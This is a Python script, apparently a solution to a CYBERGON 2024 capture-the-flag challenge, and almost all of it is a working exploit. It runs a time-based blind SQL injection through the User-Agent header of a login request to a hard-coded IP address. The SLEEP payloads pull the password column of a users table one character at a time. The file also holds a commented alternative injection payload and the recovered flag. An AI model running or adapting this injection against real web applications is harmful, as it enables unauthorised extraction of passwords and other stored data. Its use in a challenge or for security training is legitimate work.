import requests
import time

# Target URL and session cookie
url = "http://46.250.232.141:8001/"
cookie = {"PHPSESSID": "64a091994a2cc417601352088df6eae8"}

# Table and column names retrieved earlier
table_name = "users"
column_name = "password"
'''User-Agent: 1', (select password FROM users where password like "CYBERGON_CTF2024%" limit 0,1)) #'''
# Payloads and headers
def inject_data(offset, position, char):
    # Case-sensitive comparison using BINARY
    payload = f"' OR IF(SUBSTR(BINARY (SELECT {column_name} FROM {table_name} LIMIT {offset},1),{position},1)='{char}', SLEEP(7), 0), 'aaa')#"
    headers = {
        "User-Agent": payload,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": url,
        "Referer": url,
    }
    data = {"username": "okmyst", "password": "okmyst", "action": "login"}
    return headers, data

# Extract data from the column
def extract_data():
    rows = []
    offset = 0
    while True:
        row_data = ""
        # CYBERGON_TF204{0wAg3ntPdhSrv}
        for position in range(1, 50):  # Adjust max length as needed
            for char in "CYBERGON_TF204{}0wAg3ntPdhSrv":  # Include possible characters
                headers, data = inject_data(offset, position, char)

                # Measure the response time
                start_time = time.time()
                response = requests.post(url, headers=headers, data=data, cookies=cookie)
                elapsed_time = time.time() - start_time

                # Check if the condition caused a delay
                if elapsed_time > 4:  # Delay threshold (SLEEP(7))
                    row_data += char
                    print(f"Found character at position {position} in row {offset}: {char}")
                    break
            else:
                # Stop if no character is found (end of row data)
                break

        if not row_data:
            # Stop if no more rows are found
            break

        rows.append(row_data)
        print(f"Found row: {row_data}")
        break

    print(f"Extracted data: {rows}")
    return rows

if __name__ == "__main__":
    extract_data()
